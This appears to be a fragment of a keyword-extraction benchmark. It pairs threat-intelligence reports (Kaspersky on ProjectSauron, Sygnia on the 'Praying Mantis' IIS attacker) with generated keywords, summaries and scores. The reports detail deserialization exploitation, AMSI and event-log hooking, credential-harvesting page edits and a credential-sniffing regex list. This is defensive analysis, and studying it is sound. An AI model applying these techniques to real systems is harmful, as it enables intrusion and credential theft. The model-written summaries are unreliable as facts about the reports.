that is meant to be loaded as a security provider.The payload of the module \u201cInitSecurityInterfaceW\u201d if called in the context of the \u201csvchost.exe\u201d process.in a standard blob thatis wrappedis activatedin the functionThe module implements a sniffer with deep packet inspection. It supports many protocols, including generic TCP/UDP, POP3, SMTP, FTP, VNC, SMB, HTTP and TFTP. The protocol plugins extract information from most commands and then match them against a list of regular expressions specified in a configuration file. The packets that match are then stored in encrypted \u201cvault\u201d files. These may be rotated, and the module relies on other components of the platform to exfiltrate them.The configuration is stored in encrypted format in registry in one of the locations:\uf0b7 \uf0b7 \uf0b7[HKCU\\Settings] Policy [HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders] Signature [HKLM\\System\\CurrentControlSet\\Control\\Lsa] SignatureAn example of the decrypted configuration file:.*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*|.*user.*|.*name|.*email|.*_id|id|uid|mn|mailaddress|.*nick.*|alias| codice|uin|sign-in|strCodUtente|.*pass.*|.*pw|pw.*|additional_info|.*secret.*|.*segreto.* [^\\$]$ ^.*\\.(doc|xls|pdf)$For any inquiries, contact intelreports@kaspersky.comPage 33 of 33Contact us at: intelligence@kaspersky.comSecurelist, the resource for Kaspersky Lab experts\u2019 technical research, analysis, and thoughts.Follow usKaspersky Lab global WebsiteEugene Kaspersky BlogKaspersky Lab B2C BlogKaspersky Lab B2B BlogKaspersky Lab security news serviceKaspersky Lab Academy ", "generated_text": "a project; ProjectSauron; APT; PE; DLL; a code; a magic value; 0xC102AA02; RPC Helper; RC4; The configuration; a PE binary; plugins; the shellcode; the PE binary; a function table; the configuration data; the PE binary; a PE file; extensions; POST; The command; the PE binary; TCP; a PE shellcode; stdin; stderr; a PE binary; a PE module; data; the PE binary; the PE module; persistence; a recursive sniffer; the shellcode; rc4; the command; the shellcode; a persistence mechanism; the recursive sniffer; IP; the recursive sniffer; the recursive sniffer; the shellcode; the shellcode; the PLC; PE.", "ref_text": "<START-1>The document provides an in-depth technical analysis of the ProjectSauron APT malware and infrastructure. It covers multiple components used for initial infection, persistence, data exfiltration, command and control, and more. Key points: Uses LSA password filters or security providers for stealthy persistence and password theft. Custom LUA scripts control modular malware functionality. Over 50 plugin types exist. Virtual file system and encryption used to store plugins and data. Can exfiltrate data from air-gapped networks via USB devices. Leverages DNS and direct email connections for stealthy data exfiltration. Unique malware files per victim to avoid reuse of indicators. Infrastructure not reused either. Passive network sniffing tool inspects protocols like HTTP, SMTP, POP3, FTP to steal credentials. \"Bus manager\" component steals documents from USB drives by hiding storage area. Attackers carefully studied other advanced groups and customized tactics to avoid past mistakes. Overall, the document provides an extensive review of ProjectSauron's technical sophistication, custom malware, infrastructure, and techniques for long-term stealthy intrusions. <END-1>", "t5/keyword/hint_hit_precision": 0.1276595744680851, "t5/word/hint_hit_recall": 0.0375, "gpt3/lexical/rouge_rouge1": 0.2948207171314741, "gpt3/lexical/rouge_rouge2": 0.05622489959839358, "gpt3/lexical/rouge_rougeL": 0.15139442231075698, "gpt3/lexical/rouge_rougeLsum": 0.15139442231075698, "gpt3_generated_text": ["The ProjectSauron APT utilizes a PE DLL with a magic value of 0xC102AA02 and a recursive sniffer backdoor to carry out malicious activities. The code includes an RPC Helper that uses RC4 encryption and a PE binary for executing commands. The configuration data is encrypted using AES-CBC and includes information about plugins and event objects. The PE module is persistent and uses a function table to execute its plugins. Overall, the ProjectSauron APT employs sophisticated techniques to maintain control over infected systems and exfiltrate sensitive data."]}, {"split_name": "val", "sample_id": "val_28", "prompt_text": "Extract the keywords: TG1021: \u201cPraying Mantis\u201d DISSECTING AN ADVANCED MEMORY-RESIDENT ATTACKJuly 2021Sygnia Incident Response Team Contributors: Noam Lifshitz, Amitai Ben Shushan Ehrlich, Asaf Eitani, Amnon Kushnir, Gil Biton, Martin Korman, Itay Shohat and Arie ZilbersteinOverviewThe Sygnia Incident Response team identified an advanced and persistent threat actor, operating almost completely in-memory. The operators behind the activity targeted Windows internet-facing servers, using mostly deserialization attacks, to load a completely volatile, custom malware platform tailored for the Windows IIS environment. Sygnia refers to this threat actor as \u201cPraying Mantis\u201d.During the past year, Sygnia\u2019s Incident Response team has been responding to a series of targeted cyber intrusion attacks, performed by a highly capable and persistent threat actor \u2013 TG1021: \u201cPraying Mantis\u201d. These attacks targeted prominent organizations and compromised their networks by exploiting internet facing servers.The initial foothold within a network was obtained by leveraging a variety of deserialization exploits targeting Windows IIS servers and web applications. The activity observed suggests that the threat actor is highly familiar with the Windows IIS platform, and equipped with 0-day exploits.TG1021 utilize a completely volatile and custom malware framework tailor-made for IIS servers. The core component, loaded on to internet facing IIS servers, intercepts and handles any HTTP request received by the server. TG1021 also use an additional stealthy backdoor and several post-exploitations privileges, and move laterally within networks.to perform networkThe nature of the activity and general modus-operandi suggest TG1021 to be an experienced stealthy actor, highly aware of OPSEC (operations security). The malware used by TG1021 shows a significant effort to avoid detection, both by actively interfering with logging mechanisms, successfully evading commercial EDRs and by incoming connections, rather than connecting back to a C2 channel and continuously generating traffic. Furthermore, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.silently awaitingThe threat actor\u2019s tactics, techniques, and procedures (TTPs) strongly correlate with the ones described in an advisory published by the Australian Cyber Security Centre (ACSC) \u2013 \u201cCopy-paste compromises\u201d1. The advisory, published in June 2020, details the activity of a sophisticated state-sponsored actor which represents \u201cthe most significant, coordinated cyber-targeting against Australian institutions the Australian Government has ever observed.\u201d1 Copy-paste compromises2Table of Contents Overview 2 Windows IIS Server & Web Application Exploits 4 Checkbox Survey RCE Exploit (CVE-2021-27852) 4 VIEWSTATE Deserialization Exploit 5 Altserialization Insecure Deserialization 6 Telerik-UI Exploit (CVE-2019-18935, CVE-2017-11317) 7 Toolset Infrastructure & IIS Platform Malware 7 NodeIISWeb Malware 8 Hooking Mechanism 9 Payload Search 10 Module Reflective Loading 11 JScript Payload Execution 12 Traffic Forwarding 12 NodeIISWeb Reflective Loaders 14 Reflective Loader DLL 14 Loader Web Shell 15 Second Stage Malware - ExtDLL.dll 17 Additional Modules 18 PSRunner.dll 18 Forward.dll 18 PotatoEx.dll 19 E.dll 19 Post-exploitation Activities 19 Credential harvesting 19 Reconnaissance 20 Lateral Movement 20 Similarities to the Copy-Paste threat actor 20 Defending Against TG1021 Attacks 20 Sealing .NET Deserialization Exploits & Best Practices 21 Indicators of Compromise 22 Files 22 Additional IOCs 23 MITRE ATT&CK Breakdown 243Windows IIS Server & Web Application ExploitsDuring the past year Sygnia has been monitoring attacks conducted by TG1021. The actor leveraged a variety of exploits targeting internet facing servers to gain initial access to target networks. These exploits abuse deserialization mechanisms and known vulnerabilities in web applications and are used to execute a sophisticated memory- resident malware that acts as a backdoor. This malware will be referred to as the \u201cNodeIISWeb\u201d malware. The threat actor uses an arsenal of web application exploits and is an expert in their execution. The swiftness and versatility of operation combined with the sophistication of post-exploitation activities suggest an advanced and highly skillful actor conducted the operations. The following four exploits were used by the threat actor to compromise target systems.Checkbox Survey RCE Exploit (CVE-2021-27852) One of the vulnerabilities that the threat actor leveraged to exploit IIS servers is a 0-day vulnerability associated with an insecure implementation of the deserialization mechanism within the \u201cCheckbox Survey\u201d web application, a commercial survey platform. The vulnerability in the \u201cCheckbox Survey\u201d application enables remote code execution (RCE) on the target resulting with the initial compromise of an IIS server. Analysis of the activity found the vulnerability resides in an insecure implementation of the VIEWSTATE mechanism in .NET.VIEWSTATE is a mechanism in .NET used to maintain and preserve web page session data between a client and a server. When using this feature any client that browses an application receives a serialized .NET object that contains the values of specific variables. When the client sends an HTTP request back to the web application, the VIEWSTATE object is sent along with it, which in turn gets deserialized and processed on the server\u2019s side setting the variables to their previous values.The vulnerability in \u201cCheckbox Survey\u201d was identified on a specific webpage in the application where the methods originally used to handle the VIEWSTATE mechanism were replaced with an insecure and compressed version called VSTATE. As illustrated in Figure 1, the new \u201cLoadPageStateFromPersistenceMedium\u201d method does not validate the integrity of the data passed in the VSTATE variable, blindly triggering the deserialization process. Sending a crafted VSTATE variable which exploits the \u201cLosFormatter\u201d deserialization process would allow a threat actor to execute code remotely on the Checkbox application server.Figure 1: Vulnerable code snippet found within Checkbox code22 Checkbox source code found on GitHub4The same exact VSTATE implementation was published in a blog post in 2005 as a solution for a compressed implementation of VIEWSTATE. Some web applications have copied this piece of code into their own repository, exposing the application to the vulnerability. This topic of VSTATE deserialization exploits was covered in the past by Graa \u2013 Security Blog. The vulnerable piece of code was found in version 6 of the \u201cCheckbox Survey\u201d software and is shown in Figure 1.The flow of the VSTATE deserialization exploit used by the threat actor was executed in a single HTTP POST to the Checkbox application server, and is illustrated in Figure 2 below:1.2.3.The threat actor crafts and sends an HTTP POST request containing two main components \u2013 A crafted VSTATE variable containing a reflective loader DLL and a VSTATEGENERATOR variable containing the NodeIISWeb malware.The exploited deserialization process executes the reflective loader DLL contained in the VSTATE variable.The reflective loader DLL reads, decodes, and decrypts the data passed in the \u201c__VSTATEGENERATOR\u201d parameter.4. Finally, the decrypted data (the NodeIISWeb malware) is reflectively loaded and acts as a backdoor on thecompromised asset.Figure 2: Threat actor VSTATE/VIEWSTATE exploit flow.VIEWSTATE Deserialization Exploit The threat actor also leveraged and exploited the standard VIEWSTATE deserialization process to regain access to compromised machines. Newer versions of .NET enforce encryption and validation of the VIEWSTATE data and offers protection against this kind of exploit. However, if the encryption and validation keys are stolen or leaked, they can be used to bypass the integrity check mechanism and eventually execute malicious code on the IIS server.5During one of Sygnia\u2019s investigations, TG1021 leveraged stolen decryption and validation keys to exploit IIS web servers. The flow of the VIEWSTATE deserialization exploit is almost identical to the VSTATE exploit explained above, with the adjustment of encrypting and signing the VIEWSTATE data instead of compressing it.This exploit was used several times by the threat actor to regain access to compromised machines, since they rely on a volatile backdoor and tools. Additionally, it was used in order to move laterally between machines in a cluster. This is possible because if a web application is set to run in a cluster, all the instances need to share same secret keys otherwise the VIEWSTATE feature would not work.Altserialization Insecure Deserialization The threat actor leveraged a second vulnerability involving insecure deserialization to exploit IIS servers. This section describes that process.ASP.NET allows web applications to store user sessions to be used later once the user returns and interacts with the application. This works by saving a serialized .NET session object to a MSSQL database and assigning it a unique cookie which is given to the user when browsing the application. Once the user browses again with the cookie the session state is loaded and deserialized. A crafted serialized object which is written to the database could lead to remote code execution on a web application server once the implanted cookie is passed in an HTTP request.This technique was used by TG1021 in order to move laterally between IIS servers within an environment. An initial IIS server was compromised using one of the deserialization vulnerabilities listed above. From there the threat actor was able to conduct reconnaissance activities on a targeted ASP.NET session state MSSQL server and execute the exploit, as illustrated below and in Figure 3:1. After gathering information on the environment, a malicious serialized object was written to the database.2. The threat actor sent an HTTP GET request using the crafted ASP.NET session state cookie.3. The target IIS web server loaded and deserialized the matching session state object correlating to the plantedcookie.4. The deserialization process is exploited by the crafted object in order to compile an in-memory web shell.5. Immediately after the web shell was created the threat actor accessed it to reflectively load the maliciousNodeIISWeb malware on the compromised asset.6Figure 3: Altserialization exploit attack flowTelerik-UI Exploit (CVE-2019-18935, CVE-2017-11317) Telerik is known for several products providing functionality to web application development. One of the products, Telerik UI for ASP.NET AJAX, is a widely used suite of UI components for web applications. This product was found to be vulnerable due to weak encryption, enabling a malicious actor to upload a file and/or to run malicious code.The vulnerabilities were used by TG1021 to upload a web shell loader to IIS servers accessible from the internet. The web shell was later used to upload additional modules and was deleted after a short period of time. Subsequent to the initial use, the web shell was uploaded at the beginning of every following wave of threat actor activity.Toolset Infrastructure & IIS Platform MalwareTG1021 uses a custom-made malware framework, built around a common core, tailor-made for IIS servers. The toolset is completely volatile, reflectively loaded into an affected machine\u2019s memory and leaves little-to-no trace on infected targets.7The framework consists of a two-stage toolset:1. The first consists of lightweight dynamic loaders in the form of DLLs and web shells, and the core component (TheNodeIISWeb malware). These are the first stage tools used on compromised IIS webservers.2. The second stage tools are more generic Windows-based tools which consist of a stealthy backdoor and a set ofpost-exploitation modules loaded on demand to extend functionality.Figure 4: Toolset Infrastructure OverviewNodeIISWeb Malware OverviewThe NodeIISWeb malware is a .NET DLL reflectively loaded module that is injected into the w3wp.exe process of affected machines. It serves as the core component of the threat actor\u2019s malware framework and acts as the main backdoor on a compromised IIS server. It can operate in two different modes:1. IIS Hooking ModeThe malware hooks native IIS input validation functions in the injected w3wp.exe process, which provides access to all incoming HTTP traffic. The requests are analyzed by the backdoor, allowing the operators to communicate with it by sending crafted HTTP requests to any web page in the process context.82. Web Shell Controller ModeThe malware is executed and controlled using a custom web shell Loader. By sending specially crafted HTTP requests to the web shell, the operators trigger the execution of the command input function of an instance loaded to a w3wp.exe process. In this mode the NodeIISWeb will execute without hooking the IIS validation functions and can be controlled only through the specific web page where the web shell is located.The NodeIISWeb malware provides the threat actor with four different capabilities:1. Run a set of basic functions - Such as gathering system information or accessing and manipulating the file systemon the machine.2. Execute JScript payloads on the machine.3. Dynamically load additional modules.4. Perform several network related operations, including HTTP and SQL traffic forwarding and an implementation of a TCP client instance. These capabilities enable active command and control of other backdoors deployed within the network as well as control of the extension modules over the machine loopback interface.To make analysis of the module more difficult, NodeIISWeb is protected by a public tool \u201cCofuserCore\u201d which packs and obfuscates the binary.The NodeIISWeb malware bares similarity to the \u201cjs_eval\u201d malware family described in the \u201cCopy-Paste Compromises\u201d ACSC advisory. This will be further discussed in the section \u201cSimilarities to the Copy-Paste threat actor\u201d.Hooking Mechanism To establish a command-and-control channel, the malware deploys an inline hook on a validation function within the IIS request handling process. During this process, the malware will first attempt to obtain a pointer to the method \u201cValidateInputIfRequiredByConfig\u201d, which is a default function used by ASP.NET HTTPRequest class to validate any input within the request, if input validation is enabled in the web page configuration. If a pointer to the method is not found, the malware will attempt to obtain a pointer to another default method called \u201cValidateInput\u201d.The final stage of the process is then initiated when a hook is performed using the malware\u2019s built-in functionality named \u201cManagedHook\u201d. The hook swaps between the obtained method pointer and a malicious method created by the threat actor named \u201c_ValidateInput\u201d. After the malicious method is executed, the \u201cManagedHook\u201c instance calls the original hooked function.The hooking process is initiated by invoking one of the malware\u2019s methods called \u201cInitHook\u201d. The method is invoked with an additional string argument (will be referred to as \u201cHOOK_KEY\u201d). The \u201cHOOK_KEY\u201d string is crucial to the malware\u2019s operation, as it is used to search for threat actor payloads within incoming HTTP traffic. A reconstructed version of the \u201cInitHook\u201d method code is shown in the following snippet:Figure 5: IIS validation function hooking performed by the \u201cInitHook\u201d method, reconstructed by Sygnia9Payload Search The malicious function \u201c_ValidateInput\u201d is used to process incoming requests, searching for payloads in several locations within the request. The following list describes the search order for payloads:1. A file larger than 8 bytes which is attached to the request and has a name that matches the \u201cHOOK_KEY\u201d.2. An HTTP POST request containing a parameter with a key name that matches the \u201cHOOK_KEY\u201d and value lengthis greater than 8 bytes.3. An HTTP cookie with a name that matches the \u201cHOOK_KEY\u201d and that its value\u2019s length is over 10 bytes.4. If no payload was found in the previous steps, the NodeIISWeb will try to treat the whole request content as thepayload.After identifying an incoming payload, the malware attempts to extract two variables from it \u2013 A \u201cCommand\u201d variable and a \u201cForward\u201d variable. The parameters are extracted in the following procedure:1. Key and IV Generation \u2013 A decryption key is generated by calculating the SHA256 value of the payload\u2019s first 3 bytes concatenated to the \u201cHOOK_KEY\u201d string value. The malware then calculates the MD5 value of the key, the 16 bytes MD5 output is used as the IV for the decryption process.2. Decryption \u2013 The payload (starting from the 3rd byte) is decrypted with a standard AES algorithm using thegenerated key and IV from the previous step.3. Decompression \u2013 After decryption, the payload is decompressed recursively using GZip.Once the \u201cCommand\u201d and \u201cForward\u201d variables are extracted, they are used by the malware to launch the requested built-in functionality. The first byte of the \u201cCommand\u201d parameter (\u201cCommand ID\u201d) is used to determine which built-in function will be executed by the malware. In most cases, the \u201cForward\u201d data will contain the arguments for the requested function, but in some cases, the selected functionality will not require both variables and only the \u201cCommand\u201d variable is resolved. The built-in functionalities of the NodeIISWeb malware can be seen in the following table:Command ID Description 0x00Information gathering - Query domain membership, operation system information, process and owner information of the current process, time zone, network interfaces information and status and drives information. Recursive directory listing. Copying or moving files, or recursively copying directories. files and recursive directories deletion. Directory creation. Custom reflective loading. Traffic forwarding, either HTTP, SQL or TCP. used to communicate to additional backdoors installed within the network, as well as to memory loaded payloads via loopback communication. Dynamic execution of JScript payloads.0x09 C2 communication flow with the backdoor with full built-in capabilities0x01 0x0810Module Reflective Loading One of the malware\u2019s most interesting built-in function capabilities is reflective loading of custom DLLs. In order to reflectively load a payload, the following 3-step procedure is performed using the \u201cCommand\u201d and \u201cForward\u201d variables as arguments:1. A random port is selected by the malware for future communications with the loaded module. The port\u2019s availability is checked by opening and closing a TCP socket over the loopback. After that, a target IP address is extracted from the \u201cCommand\u201d variable in the format of a 32 bit integer. The port and IP are concatenated to form a struct which is later passed as an argument to the loaded module.Figure 6: Random port generation before reflective DLL loadingA shellcode is extracted from the \u201cCommand\u201d variable and loaded to memory. This shellcode reflectively loads a DLL passed in the \u201cForward\u201d variable and returns a pointer to an initial method. If a shellcode and DLL were previously loaded, the NodeIISWeb will use the previously exported method unless given a flag which forces a reload and execution of the shellcode and DLL.a. The custom shellcode that performs the necessary operations to enable execution of the loaded DLL, forexample relocations within the binary.b. The shellcode returns a pointer to a specific exported function of the DLL by comparing the name of the exported function to a hash value embedded within the shellcode. That way the threat actor controls which function is returned by generating a custom shellcode for any needed function.c. If no DLL was provided in the \u201cForward\u201d variable \u2013 the shellcode is simply executed with a null-pointer asargument, allowing execution of generic shellcodes.Figure 7: Reconstructed InitLoader method - Execution of shellcode to reflectively load payload DLL2. Finally, the exported method is invoked using the structure created in step 1 as an argument.11Figure 8: Reflective loading of payload DLL and invocation of the selected functionA sample shellcode was acquired alongside the malicious DLL that was loaded using that shellcode. The shellcode which was found is a Position Independent Code (PIC) used to reflectively load \u201cExtDLL.dll\u201d to memory by allocating, writing and relocating any needed addresses to the appropriate allocated address. The exported method returned by the shellcode is a method named \u201cHello\u201d \u2013 which is the method used to execute the main flow of \u201cExtDLL.dll\u201d.JScript Payload Execution The malware implements code execution by invoking in-memory Jscript code sent to the NodeIISWeb malware. This is done by loading the \u201cMicrosoft.Jscript.Eval\u201d assembly to the current process and invoking the \u201cJscriptEvaluate\u201d function with the given payload. The malware uses a custom hardcoded template script-block for the Jscript code execution:Figure 9: NodeIISWeb hard coded Jscript evaluation codeFigure 10: Invocation of Jscript evaluation codeThis method of implementation achieves a stealthy remote code execution method by avoiding spawning new process on the machine.Traffic Forwarding The NodeIISWeb malware enables three types of traffic forwarding:1. TCP Tunneling \u2013 used as a C2 channel to other in-memory modules or additional NodeIISWeb instances in an12infected network.2. HTTP forwarding3. SQL forwarding Both HTTP and SQL traffic forwarding commands are implemented with an additional XML formatted string containing configuration instructions for crafting the relevant traffic. The different XML attributes allow for creation of different HTTP and SQL requests. By default, the HTTP method is set to GET, unless additional data is passed to the function through the matching \u201cData\u201d variable. The following table summarizes each attribute role in an XML describing an HTTP request:Description Target URL Windows user impersonation Request timeout Network credentials are to be used Domain name (only applicable if \u201cAT\u201d is defined) Username (only applicable if \u201cAT\u201d is defined) User password (only applicable if \u201cAT\u201d is defined) Web proxy is to be used and defined in \u201cAD\u201d attribute Web proxy domain name (only applicable if \u201cPX\u201d and \u201cPU\u201d are defined) Web proxy username (only applicable if \u201cPX\u201d is defined) Web proxy password (only applicable if \u201cPX\u201d and \u201cPU\u201d are defined) Headers to be added to the request Header name contained under \u201cH\u201d attributes (only applicable if \u201cH\u201d defined)XML Attribute A similar XML would be provided to craft an SQL query with the following attributes: The functionality of traffic forwarding in the main NodeIISWeb malware is a direct implementation of the \u201cForward.dll\u201d module with additions for the SQL traffic. This mechanism of traffic forwarding has some default values which are used in the requests generated. These characteristics, such as a default user-agent, can be used to detect malicious traffic.Description SQL connection string Windows user impersonation SQL query SQL command timeout13NodeIISWeb Reflective Loaders As a volatile tool, the NodeIISWeb malware is used by the threat actor solely in-memory. To do so, the tool is loaded dynamically into the process memory using one of the following ways:1. When the threat actor had RCE capabilities on a target IIS server, a DLL acting as a dynamic loader was usedas an initial payload for the exploit. This DLL in turn dynamically loads the NodeIISWeb malware calling the \u201cInitHook\u201d method.2. When the threat actor only had the ability to upload files to a target IIS server, an NodeIISWeb web shell loaderand controller was deployed. The initial access to this web shell created an NodeIISWeb instance on the machine (without hooking the IIS validation methods), and further access would be made to control the malware.Both loaders are similar to one another in their functionality and basic safety measures, however there is a significant difference in the operational mode and control over the malware.Reflective Loader DLL A lightweight .NET reflective loader designed to load malicious .NET DLLs to the IIS process memory and execute a selected function within it. This DLL was used in the VIEWSTATE/VSTATE deserialization exploit workflow to execute the threat actors\u2019 main implant \u2013 the NodeIISWeb malware. In the instances observed, the threat actor invoked the \u201cInitHook\u201d method to initialize an NodeIISWeb malware instance and hook HTTP validation functions on the servers. By doing so, the threat actor established the first foothold on the target server.The DLL does not persist on the victim machine, which means it is uploaded as a payload in every exploit. Once the DLL is loaded it checks if the request that it was sent with is above 4096 bytes in size. If so, it searches for the \u201c__VSTATEGENERATOR\" parameter and attempts to decode and decrypt it using a basic XOR operation.The decoded payload consists of three main sections:1. The first 2 bytes are used in the decryption process as XOR keys.2. Bytes 2-32 are a string containing the .NET class name, function name within that class and argument supplied tothe function, all separated by pipe characters (\"|\").3. The rest of the payload is a .NET DLL, containing the said .NET class.The returned response contains the header \"Pragma\" with the value \"no-cache\", signaling a successful execution.14Figure 11: A snippet of code from ReflectiveLoadForms.dllLoader Web Shell On some occasions, TG1021 deployed a web shell on IIS servers for a short period of time. In most cases, these web shells were deleted shortly after they were dropped. The web shell functionality is almost identical to the Reflective Loader DLL, as it used to load binaries and initialize a malware instance from within it, using an almost identical decryption and decoding mechanism:1. The first 2 bytes are used in the decryption process as XOR keys.2. Bytes 2-32 represent an array of strings later used for invocation, separated by \u201c|\u201d.3. All bytes starting from 32 are the malicious binary payload.15Figure 12: The NodeIISWeb Loader & Controller web shellThe first object in the string array \u201ckeys\u201d is placed in the web application HTTP cache under the value \u201c_CAPCACHE__CAPCACHE_\u201d. When the NodeIISWeb malware instance is initialized without arguments, it looks for the value stored in this key to be used as the \u201cHOOK_KEY\u201d.Figure 13: The IISNode class constructorAfter initialization, a pointer to the malware instance is saved in the web application HTTP cache under the key \u201c_CAPCACHE_\u201d. When the attacker revisits the specific webpage, the object\u2019s \u201cToString\u201d method is invoked which in turn initiates the C2 logic of the malware. Without knowing what object is stored in the cache under the key \u201c_CAPCACHE_\u201d, it might seem as a legitimate comparison between two string objects, when really the \u201cToString\u201d16method triggers the malware commands.In a few cases the threat actor placed the controller in specific locations leveraging default IIS webpage naming. The threat actor would locate a directory in the web application that did not contain a default webpage file and place the controller in that directory using one of the default document namings. When the threat actor would request the directory via HTTP without requesting a specific resource, the IIS server would serve the first resource matching one of the default values.Figure 14: Default IIS configuration for \u201cdefaultDocument\u201d filesSecond Stage Malware - ExtDLL.dll The threat actor uses a generic Windows-based malware for operating on compromised Windows machines as a second stage for the NodeIISWeb malware. The backdoor uses a passive C2 channel, listening for incoming TCP connections, minimizing network traffic when it is not in use. The tool provides backdoor functionality, allowing the threat actor to perform various actions on the affected host, for example:\u2022 File and directory manipulation (read, write, delete, copy, move)\u2022 System information gathering\u2022 Dynamic DLL loading and execution\u2022 Code injection, token manipulation and additional common attack technique functionalitiesThe malware also holds defense tampering capabilities to hide its activities by applying inline hooks on specific security related functions on all the process\u2019 threads:1. AV scanning functions \u2013 The malware hooks the functions \u201cAmsiScanBuffer\u201d and \u201cAmsiScanString\u201d from the\u201cAmsi.dll\u201d library with a simple function which returns AMSI_RESULT_CLEAN.2. Event log reporting functions \u2013 The malware hooks the functions \u201cReportEventW\u201d and \u201cEventWriteTransfer\u201d from the \u201cAdvapi32.dll\u201d library with a simple function which returns 1 (any non-zero value is considered as conformation that the event was written). By doing so the malware disables the capability of event logging from the affected process.3. .NET codetrust checks \u2013 The malware hooksfunctions \u201cWldpQueryDynamicCodeTrust\u201d and \u201cWldpIsClassInApprovedList\u201d functions from the \u201cWldp.dll\u201d library. The purpose of those hooks is to bypass Device Guard policy and execute malicious .NET code in memory. The hook leads to yet another simple function returning S_OK value.the4. PowerShell related registry keys actions \u2013 The malware hooks the function \u201cRegOpenKeyExW\u201d from \u201cAdvapi32.dll\u201d. return anincluding \u201cSoftware\\policies\\microsoft\\Windows\\Powershell\u201d willsubkey under orAny ERROR_FILE_NOT_FOUND error.17Figure 15: Hooking of Anti-Virus and .NET Device Guard functionsAlthough it seems that the malware performs the hooking only on the current injected process, it holds the capability to perform this behavior on other user-land processes. The threat actor leveraged the NodeIISWeb and ExtDLL.dll malware to execute other modules, containing additional capabilities. These modules are .NET modules, which were obfuscated using Confuser.Core 1.4.1 (build 5d92e25e43).PSRunner.dll \u201cPSRunner.dll\u201d provides the threat actor with the ability to run PowerShell script-blocks on a host without spawning a PowerShell process and manage incoming PowerShell payloads. Some of the functionality of the module resembles the functionality of an open-source tool named \u201cUnmanagedPowerShell\u201d3, which enables execution of PowerShell script blocks from an unmanaged process. A snippet from PSRunner code is shown below.Figure 16: A snippet of code from PSRunner.dllForward.dll \u201cForward.dll\u201d enables the threat actor to forward HTTP traffic to a remote host based on a given set of parameters. The DLL\u2019s functionality is also implemented in the NodeIISWeb malware and replicates its traffic forwarding capabilities. The traffic forwarding is done by processing an XML formatted string containing instructions, and by assembling a request with the given parameters \u2013 see Traffic Forwarding for the full list of parameter options.3 url 17: A snippet of code from Forward.dllPotatoEx.dll \u201cPotatoEx.dll\u201d is a custom version of the Potato family tools, which is a common local privilege Escalation (PE) tool. Consistent with the other tools in the threat actor\u2019s arsenal, this is a .NET version of the Potato family, which also has implementations of additional open-source tools such as \u201cPingCastle\u201d \u2013 also seen in \u201cBadPotato\u201d.E.dll \u201cE.dll\u201d is a lightweight .NET payload used by the threat actor to verify whether an exploit had successfully executed on a target IIS server. A successful exploit with \u201cE.dll\u201d as a payload would result in a HTTP response containing custom fabricated headers, cookies, and content.The name \u201cE.dll\u201d has a direct connection the \u201cYSoSerial.Net\u201d open-source tool used to generate payloads that exploit insecure .NET object deserialization. During preparation of payloads using \u201cYSoSerial.Net\u201d, the deserialization gadget searches for \u201ce.dll\u201d as the payload for the operation.Post-exploitation ActivitiesThe threat actor utilized the access provided using the IIS to conduct additional activity, including credential harvesting, reconnaissance, and lateral movement.Credential harvesting The threat actor modified login webpages to record credentials and save them to a file in clear text format. The modification is a short-embedded code-block at the beginning of the webpage file with a simple try-catch phrase code:19Figure 18: Credential tap code block modificationThe short piece of code checks the \u201cUserName\u201d and \u201cPassword\u201d attributes in a post-back form and if both are not empty, they are stored in clear text to the designated output path. Once users would login to the website, credentials would be stored there and the threat actor could easily access the file by browsing the relevant path. The name of the output file chosen by TG1021 would resemble a native file in an existing directory with a different extension in order to blend in with legitimate requests to the server.Reconnaissance As in many other cases, the threat actor used publicly available offensive security tools (OST) in order to perform reconnaissance. For example, \u201cSharpHound\u201d was used to scan and map targets by loading it directly to infected machines memory without writing the binary on the disk. Quickly after the execution, the threat actor retrieved the output files and deleted them. In addition, \u201cPowerSploit\u201d was loaded and executed using the same technique.Lateral Movement After establishing foothold on an external IIS server, the threat actor access shared folders on internal web servers over SMB using compromised domain credentials. On several occasions the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers.Additionally, the threat actor utilized the exploits mentioned above to move laterally between IIS servers.Similarities to the Copy-Paste threat actorThe Tactics, Techniques and Procedures (TTPs) used by TG1021, bare various similarities to those of \u201cCopy-Paste Compromises\u201d actor described by the Australian Cyber Security Centre (ACSC). The advisory, published in June 2020, details the TTPs of a sophisticated state-sponsored actor targeting Australian public and private sector organizations.Much like TG1021, the threat actor described in the advisory utilizes a variety of deserialization exploits and specifically the Telerik UI vulnerabilities and VIEWSTATE handling in Microsoft IIS servers. There are major overlaps in the toolsets used by both actors, such as the usage of JScript payloads, Potato family malware and \u201cConfuser\u201d for obfuscation. The \u201cPowerHunter\u201d malware described in the advisory provides extremely unique functionality, high similar to \u201cExtDLL.dll\u201d described in this report.It is important to note the activity described in the advisory is wider and consists of additional tactics, techniques and procedures that were not observed in the activities analyzed by Sygnia.Defending Against TG1021 AttacksAs a volatile threat actor, defending against TG1021 attacks is a tough task. We recommend the following:1. Patching .NET deserialization vulnerabilities2. Searching for known indicators of compromise3. Scanning internet facing IIS servers with a set of Yara rules designed to detect the tools discussed in this paper204. Actively hunt for suspicious activity on internet-facing IIS environmentsSealing .NET Deserialization Exploits & Best Practices 1. Telerik Version Update \u2013If you are running a .NET web application that uses Telerik UI for ASP.NET AJAX, make sure to use the newest version that is not vulnerable to known CVEs.2. Enforce VIEWSTATE MAC validation and Rotate Machine Keys Routinely \u2013VIEWSTATE deserialization attacks can easily lead to a network compromise due to a small misconfiguration. Version 4.5 of .NET enforces the relevant security measures of validating VIEWSTATE messages before attempting deserialization. Make sure the following configurations are in place: \u2022 Ensure the \u201cenableViewStateMac\u201d variable in the IIS configuration is set to True. \u2022 Ensure the \u201caspnet:AllowInsecureDeserialization\u201d variable in the IIS configuration is set to False.\u2022 Ensure the registry key \u201cAspNetEnforceViewStateMac\u201d under the path\u201cHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\<Version>\u201d is set to 1.In addition to these security measures, encryption and validation keys should be handled with care as sensitive credentials. If possible, use auto-generated keys, otherwise routinely rotate the machine keys on your IIS servers to make sure you would not be susceptible to attacks where keys were stolen or leaked.3. Validate any usage of VSTATE in .NET applications \u2013If any of the .NET web applications running in your environment use the compressed version of VIEWSTATE (whether homebrew or a third-party application), validate the implementation is done securely. Search for the following piece of code in your applications, and make sure they are replaced:Figure 19: Insecure implementation of compressed VIEWSTATE4. Secure ASP.NET session DB \u2013If ASP.NET session state is used by your web applications make sure access to the database can only be done from legitimate network locations. Separate session state MSSQL databases between different IIS servers / web applications as much as 